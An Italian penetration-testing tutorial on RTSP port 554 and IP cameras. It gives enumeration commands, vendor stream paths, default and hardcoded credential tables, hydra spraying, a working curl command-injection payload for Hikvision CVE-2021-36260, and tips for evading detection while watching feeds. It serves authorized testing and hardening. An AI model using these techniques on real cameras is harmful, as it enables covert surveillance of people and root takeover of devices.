---
title: 'Porta 554 RTSP: credenziali default, path vendor e feed video delle telecamere IP.'
slug: porta-554-rtsp
description: 'Scopri cos’è la porta 554 RTSP, come individuare path Hikvision, Dahua e altri vendor, e perché stream CCTV, DVR e NVR con auth debole o assente rappresentano un rischio reale per la videosorveglianza.'
image: /porta-554-rtsp.webp
draft: true
date: 2026-04-06T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - ip-camera
  - cameradar
featured: true
---

> **Executive Summary** — La porta 554 RTSP espone il Real-Time Streaming Protocol, usato da telecamere IP, DVR, NVR e media server. La maggioranza dei device ha credenziali default o nessuna autenticazione sugli stream. Il pentester può enumerare i path, accedere ai feed e dimostrare la compromissione della sorveglianza fisica. Questa guida copre discovery, enumerazione per vendor, credential spray e accesso ai feed.

TL;DR

* La porta 554 RTSP è il canale streaming di telecamere IP — spesso senza auth o con `admin:admin`
* Ogni vendor ha path diversi (`/Streaming/Channels/101` Hikvision, `/cam/realmonitor` Dahua) — l'enumerazione è fondamentale
* Accedere a un feed video è un finding ad alto impatto: sorveglianza compromessa = rischio fisico nel report

Porta 554 RTSP è il protocollo standard per il controllo dello streaming media in tempo reale, usato massivamente da telecamere IP e sistemi CCTV. La porta 554 vulnerabilità più comune è l'assenza totale di autenticazione o l'uso di credenziali default mai cambiate sui dispositivi. L'enumerazione porta 554 rivela modello del device, firmware, path degli stream e metodi di autenticazione supportati. Nel RTSP pentest, accedere a un feed video è un finding critico che dimostra la possibilità per un attacker di osservare ambienti fisici, identificare persone e movimenti. Nella kill chain si posiziona come information disclosure e recon visiva — ma su device vulnerabili (Hikvision CVE-2021-36260) può portare a RCE diretta.

## 1. Anatomia Tecnica della Porta 554

La porta 554 è registrata IANA come `rtsp` su TCP e UDP. RTSP (RFC 7826) è un protocollo di controllo sessione — gestisce il flusso ma non trasporta i dati media (quello è RTP, su porte UDP dinamiche).

Il flusso RTSP:

1. **OPTIONS**: il client chiede quali metodi supporta il server (DESCRIBE, SETUP, PLAY, TEARDOWN)
2. **DESCRIBE**: richiesta della descrizione SDP dello stream (codec, risoluzione, bitrate)
3. **SETUP**: negozia il trasporto (RTP/UDP o RTP/TCP interleaved)
4. **PLAY**: avvia lo streaming video/audio
5. **TEARDOWN**: chiude la sessione

Le varianti sono RTSP su TCP (554), RTSPS su TLS (322), RTSP su porta custom (8554 frequente su media server). L'URL completo è `rtsp://user:pass@IP:554/path`.

```
Misconfig: Stream RTSP senza autenticazione
Impatto: chiunque sulla rete visualizza il feed video in tempo reale
Come si verifica: ffplay rtsp://10.10.10.50:554/live
```

```
Misconfig: Credenziali default non cambiate (admin:admin, admin:12345)
Impatto: accesso completo a configurazione device, controllo PTZ, recording
Come si verifica: ffplay rtsp://admin:admin@10.10.10.50:554/Streaming/Channels/101
```

```
Misconfig: RTSP esposto su rete non segmentata o su Internet
Impatto: telecamere di sicurezza accessibili da VLAN utenti o dall'esterno
Come si verifica: nmap -sV -p 554 [subnet] — se risponde da VLAN non-security, è esposto
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 554 10.10.10.50
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
554/tcp open  rtsp    Hikvision IP Camera rtspd
|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN, SET_PARAMETER
```

**Parametri:**

* `-sV`: fingerprint del device (rivela vendor e modello)
* `-sC`: script default tra cui `rtsp-methods` per i metodi supportati
* `-p 554`: porta RTSP standard

### Comando 2: ffprobe per info stream

```bash
ffprobe -v quiet -print_format json -show_streams rtsp://10.10.10.50:554/Streaming/Channels/101
```

**Output atteso:**

```json
{
  "streams": [{
    "codec_name": "h264",
    "width": 1920,
    "height": 1080,
    "r_frame_rate": "25/1",
    "codec_type": "video"
  }]
}
```

**Cosa ci dice questo output:** stream H.264 a 1080p 25fps — telecamera ad alta risoluzione senza autenticazione (se non ha chiesto credenziali). Il path `/Streaming/Channels/101` conferma un device Hikvision. Se ffprobe restituisce errore 401, serve autenticazione.

## 3. Enumerazione Avanzata

### Path RTSP per vendor

Ogni produttore usa path diversi. Questa tabella è fondamentale per l'enumerazione:

| Vendor         | Main Stream                            | Sub Stream                |
| -------------- | -------------------------------------- | ------------------------- |
| Hikvision      | `/Streaming/Channels/101`              | `/Streaming/Channels/102` |
| Dahua/Amcrest  | `/cam/realmonitor?channel=1&subtype=0` | `subtype=1`               |
| Axis           | `/axis-media/media.amp`                | `?camera=2`               |
| Reolink        | `/h264Preview_01_main`                 | `_01_sub`                 |
| Samsung/Hanwha | `/profile1/media.smp`                  | `/profile2/media.smp`     |
| Uniview        | `/media/video1`                        | `/media/video2`           |
| Foscam         | `/videoMain`                           | `/videoSub`               |

### Brute force path con Nmap

```bash
nmap -p 554 --script rtsp-url-brute 10.10.10.50
```

**Output:**

```
PORT    STATE SERVICE
554/tcp open  rtsp
| rtsp-url-brute:
|   /live - 200 OK
|   /cam/realmonitor?channel=1&subtype=0 - 200 OK
|   /Streaming/Channels/101 - 401 Unauthorized
|_  /h264Preview_01_main - 404 Not Found
```

**Lettura dell'output:** il path `/live` e `/cam/realmonitor` rispondono 200 — accessibili senza auth. `/Streaming/Channels/101` richiede credenziali (401). `/h264Preview_01_main` non esiste (404) — non è un Reolink. Per approfondire l'enumerazione dei device IoT, consulta la [guida alla ricognizione di rete](https://hackita.it/articoli/enumeration).

### Cameradar — tool automatizzato

```bash
docker run --rm -t ullaakut/cameradar -t 10.10.10.0/24
```

**Output:**

```
[+] Found 3 RTSP streams:
  10.10.10.50:554 /Streaming/Channels/101 [auth: digest] [Hikvision]
  10.10.10.51:554 /cam/realmonitor?channel=1&subtype=0 [auth: none] [Dahua]
  10.10.10.52:554 /live [auth: basic] [Generic]
```

**Lettura dell'output:** cameradar ha trovato 3 telecamere. La Dahua non ha autenticazione — accesso diretto al feed. La Hikvision usa Digest auth, la generica usa Basic (credenziali in base64, sniffabili). Per correlare con servizi web delle telecamere, consulta le [tecniche di enumerazione HTTP](https://hackita.it/articoli/http).

### Credenziali default per vendor

| Vendor        | Username | Password             | Note                                             |
| ------------- | -------- | -------------------- | ------------------------------------------------ |
| Hikvision     | `admin`  | `12345`              | Firmware recenti richiedono attivazione          |
| Dahua/Amcrest | `admin`  | `admin` o `admin123` | —                                                |
| Axis          | `root`   | *(vuota)*            | Firmware recenti richiedono setup                |
| Reolink       | `admin`  | *(vuota)*            | —                                                |
| Uniview       | `admin`  | `123456`             | —                                                |
| Foscam        | `admin`  | *(vuota)*            | —                                                |
| XiongMai OEM  | `admin`  | *(vuota)*            | RTSP hardcoded: `wphd/2MNswbQ5` (CVE-2025-65857) |

## 4. Tecniche Offensive

**Accesso diretto a feed senza autenticazione**

Contesto: telecamera Dahua con RTSP senza auth, trovata con cameradar.

```bash
ffplay rtsp://10.10.10.51:554/cam/realmonitor?channel=1&subtype=0
```

**Output (successo):**

```
(finestra video si apre con il feed in tempo reale della telecamera)
```

**Output (fallimento):**

```
[rtsp] method DESCRIBE failed: 401 Unauthorized
```

**Cosa fai dopo:** feed aperto — documenta con screenshot per il report. Registra un campione: `ffmpeg -i rtsp://10.10.10.51:554/cam/realmonitor?channel=1&subtype=0 -t 10 -c copy evidence.mp4`. Nota: in un pentest reale, registra il minimo necessario per dimostrare l'impatto, rispettando la privacy.

**Credential spray su RTSP**

Contesto: telecamera Hikvision con auth Digest. Testa credenziali default e comuni.

```bash
hydra -l admin -P /usr/share/wordlists/camera_passwords.txt -f 10.10.10.50 rtsp
```

**Output (successo):**

```
[554][rtsp] host: 10.10.10.50   login: admin   password: Hik12345
```

**Output (fallimento):**

```
[STATUS] 50 of 50 tries done, no valid pair found
```

**Cosa fai dopo:** con le credenziali valide, accedi al feed: `ffplay rtsp://admin:Hik12345@10.10.10.50:554/Streaming/Channels/101`. Accedi anche all'interfaccia web sulla porta 80/443 per configurazione completa del device. Usa le credenziali per testare il [password reuse su altri servizi](https://hackita.it/articoli/bruteforce).

**Sfruttamento CVE-2021-36260 (Hikvision RCE)**

Contesto: telecamera Hikvision con firmware non aggiornato. Questa CVE fornisce command injection unauthenticated via `/SDK/webLanguage`.

```bash
# Verifica vulnerabilità
curl -s "http://10.10.10.50/SDK/webLanguage" --data '<xml><language>$(id)</language></xml>'
```

**Output (vulnerabile):**

```
uid=0(root) gid=0(root)
```

**Output (patchato):**

```
<ResponseStatus><statusCode>4</statusCode></ResponseStatus>
```

**Cosa fai dopo:** hai RCE come root sulla telecamera. Puoi estrarre credenziali memorizzate, usare la camera come pivot nella rete (le telecamere sono spesso su VLAN con accesso a segmenti interni). Per pivot avanzato, consulta le [tecniche di lateral movement](https://hackita.it/articoli/pivoting).

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con sistema CCTV Hikvision

**Situazione:** azienda con 50 telecamere Hikvision su VLAN dedicata. Hai accesso alla rete interna da una workstation compromessa.

**Step 1:**

```bash
nmap -sV -p 554 10.10.20.0/24 --open
```

**Output atteso:**

```
10.10.20.10-60 - 554/tcp open rtsp Hikvision
```

**Step 2:**

```bash
ffplay rtsp://admin:12345@10.10.20.10:554/Streaming/Channels/101
```

**Se fallisce:**

* Causa probabile: password cambiata dal default
* Fix: prova `Hik12345`, `admin123`, nome azienda + anno. Se niente funziona: `hydra -l admin -P wordlist.txt 10.10.20.10 rtsp`

**Tempo stimato:** 5-15 minuti per la prima camera, poi le credenziali sono quasi sempre le stesse su tutte

### Scenario 2: Telecamere esposte su Internet (external pentest)

**Situazione:** IP pubblico del cliente con porta 554 aperta. Assessment esterno.

**Step 1:**

```bash
nmap -sV -p 554,8554,80,443 [target_ip]
```

**Output atteso:**

```
554/tcp open rtsp
80/tcp  open http  Hikvision-Webs
```

**Step 2:**

```bash
docker run --rm -t ullaakut/cameradar -t [target_ip]
```

**Se fallisce:**

* Causa probabile: firewall intermittente o RTSP su porta non standard
* Fix: prova 8554, 1554, 10554. Verifica l'interfaccia web per trovare la porta RTSP configurata

**Tempo stimato:** 5-10 minuti

### Scenario 3: OT/ICS con telecamere non gestite

**Situazione:** impianto industriale con telecamere di sorveglianza su rete flat condivisa con PLC e HMI.

**Step 1:**

```bash
nmap -sV -p 554 192.168.1.0/24 --open -Pn
```

**Step 2:**

```bash
# Telecamere OT spesso hanno credenziali default o nessuna auth
ffplay rtsp://192.168.1.100:554/live
```

**Se fallisce:**

* Causa probabile: protocollo proprietario invece di RTSP standard
* Fix: verifica porta 80 per web interface e cerca il path RTSP nella configurazione

**Tempo stimato:** 5-15 minuti

## 6. Attack Chain Completa

| Fase       | Tool           | Comando chiave                                    | Output/Risultato    |
| ---------- | -------------- | ------------------------------------------------- | ------------------- |
| Recon      | nmap           | `nmap -sV -p 554 [subnet]`                        | Device RTSP attivi  |
| Path Enum  | cameradar/nmap | `cameradar -t [subnet]`                           | Path e auth type    |
| Credential | hydra          | `hydra -l admin -P list.txt [target] rtsp`        | Password trovata    |
| Access     | ffplay         | `ffplay rtsp://user:pass@[target]/path`           | Feed video live     |
| Evidence   | ffmpeg         | `ffmpeg -i rtsp://... -t 10 -c copy evidence.mp4` | Campione registrato |
| Escalation | curl           | CVE-2021-36260 su Hikvision                       | Root shell          |

**Timeline stimata:** 5-30 minuti dalla discovery al feed video.

**Ruolo della porta 554:** è la finestra sulla sicurezza fisica dell'organizzazione. Un feed compromesso è un finding che parla direttamente al management.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log della telecamera**: tentativi di autenticazione RTSP falliti (se il device logga — molti non lo fanno)
* **NMS/VMS**: connessioni RTSP da IP non nel VMS (Video Management System)
* **IDS**: traffico RTSP da subnet non autorizzate

### Tecniche di Evasion

```
Tecnica: Accesso in orario di manutenzione
Come: connettiti durante orari in cui i tecnici CCTV fanno manutenzione (6-8 AM)
Riduzione rumore: il traffico RTSP extra è atteso
```

```
Tecnica: Sub-stream invece di main stream
Come: usa il path del sub-stream (bassa risoluzione) — meno bandwidth, meno visibile
Riduzione rumore: meno impatto sulla banda della telecamera
```

```
Tecnica: Singola connessione breve
Come: cattura 10 secondi e disconnetti, non mantenere feed aperto
Riduzione rumore: una connessione breve è meno rilevabile di uno stream continuo
```

## 8. Toolchain e Confronto

| Aspetto       | RTSP (554/TCP)    | ONVIF (80/TCP) | MJPEG HTTP (80) |
| ------------- | ----------------- | -------------- | --------------- |
| Porta         | 554               | 80/8080        | 80              |
| Protocollo    | RTSP/RTP          | SOAP/XML       | HTTP GET        |
| Auth          | Basic/Digest      | WS-Security    | Basic/None      |
| Qualità       | H.264/H.265 full  | Via RTSP       | JPEG frames     |
| Tool primario | cameradar, ffplay | onvif-cli      | Browser         |

## 9. Troubleshooting

| Errore / Sintomo                   | Causa                                 | Fix                                                                    |
| ---------------------------------- | ------------------------------------- | ---------------------------------------------------------------------- |
| `401 Unauthorized`                 | Credenziali richieste                 | Prova default del vendor (vedi tabella sez. 3) o brute force con hydra |
| `Connection refused` su 554        | RTSP su porta custom                  | Scansiona range: `nmap -p 554,8554,1554,10554`                         |
| ffplay si connette ma schermo nero | Codec non supportato o stream offline | Prova sub-stream o usa VLC: `vlc rtsp://...`                           |
| `404 Not Found` sul path           | Path sbagliato per il vendor          | Usa `rtsp-url-brute` di nmap o cameradar per trovare il path corretto  |
| Timeout sulla connessione          | Firewall o telecamera offline         | Verifica con `nc -vz [target] 554` se la porta è raggiungibile         |

## 10. FAQ

**D: Come accedere al feed di una telecamera IP sulla porta 554?**

R: Identifica il vendor (nmap), trova il path corretto (tabella per vendor o cameradar), testa credenziali default. Il comando base è `ffplay rtsp://user:pass@[IP]:554/[path]`.

**D: Porta 554 RTSP è TCP o UDP?**

R: RTSP usa TCP per il canale di controllo (setup, play, teardown). I dati video/audio viaggiano via RTP su UDP (porte dinamiche) o in TCP interleaved. La porta 554 è TCP.

**D: Quali sono le credenziali default più comuni per telecamere IP?**

R: Hikvision `admin:12345`, Dahua `admin:admin`, Axis `root:(vuota)`, Uniview `admin:123456`. XiongMai ha credenziali RTSP hardcoded `wphd:2MNswbQ5` non modificabili (CVE-2025-65857).

**D: Come proteggere le telecamere RTSP?**

R: Cambia le credenziali default al primo setup. Segmenta le telecamere su VLAN dedicata senza accesso da VLAN utenti. Disabilita RTSP se usi solo ONVIF/web. Aggiorna il firmware regolarmente.

**D: Cameradar cosa fa esattamente?**

R: Cameradar scansiona una rete per device RTSP, brute-force i path degli stream usando un dizionario di URL noti per vendor, e testa credenziali default. Restituisce URL completi pronti per ffplay/VLC.

## 11. Cheat Sheet Finale

| Azione           | Comando                                                    | Note                    |
| ---------------- | ---------------------------------------------------------- | ----------------------- |
| Scan RTSP        | `nmap -sV -p 554 [subnet] --open`                          | Identifica device       |
| Path brute       | `nmap -p 554 --script rtsp-url-brute [target]`             | Trova path validi       |
| Cameradar        | `docker run --rm -t ullaakut/cameradar -t [subnet]`        | Scan + creds + path     |
| Test feed        | `ffplay rtsp://admin:admin@[target]:554/[path]`            | Apre il video           |
| Registra         | `ffmpeg -i rtsp://... -t 10 -c copy evidence.mp4`          | Max 10 sec per evidence |
| Credential spray | `hydra -l admin -P list.txt [target] rtsp`                 | Brute force             |
| Info stream      | `ffprobe rtsp://[target]:554/[path]`                       | Codec e risoluzione     |
| CVE Hikvision    | `curl "http://[target]/SDK/webLanguage" --data '<xml>...'` | RCE se vulnerabile      |

### Perché Porta 554 è rilevante nel 2026

Le telecamere IP sono i dispositivi IoT più diffusi e meno patchati in ogni rete. Studi recenti hanno trovato oltre 40.000 telecamere esposte su Internet con feed accessibili senza autenticazione. CVE-2021-36260 (Hikvision) è ancora attivamente sfruttata, e CVE-2025-65857 (XiongMai) ha introdotto credenziali RTSP hardcoded non modificabili. Includi sempre la porta 554 in ogni scan di rete interna ed esterna.

### Hardening e Mitigazione

* Cambia credenziali default su ogni telecamera al primo setup — incluse credenziali RTSP, web e ONVIF
* Segmenta le telecamere su VLAN dedicata con ACL restrittive: solo il VMS accede alla 554
* Disabilita RTSP se il VMS usa ONVIF o RTSP over TLS
* Aggiorna firmware regolarmente — verifica su sito del vendor

### OPSEC per il Red Team

Le telecamere raramente loggano connessioni RTSP in modo dettagliato. Il rischio principale è il VMS: se centralizzato (Milestone, Genetec), monitora le connessioni per IP. Per ridurre visibilità: usa il sub-stream (meno banda), connessioni brevi (10 secondi max) e opera da un IP nella stessa VLAN delle telecamere.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 7826 (RTSP 2.0), CVE-2021-36260, CVE-2025-65857. Approfondimento: [https://www.speedguide.net/port.php?port=554](https://www.speedguide.net/port.php?port=554)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
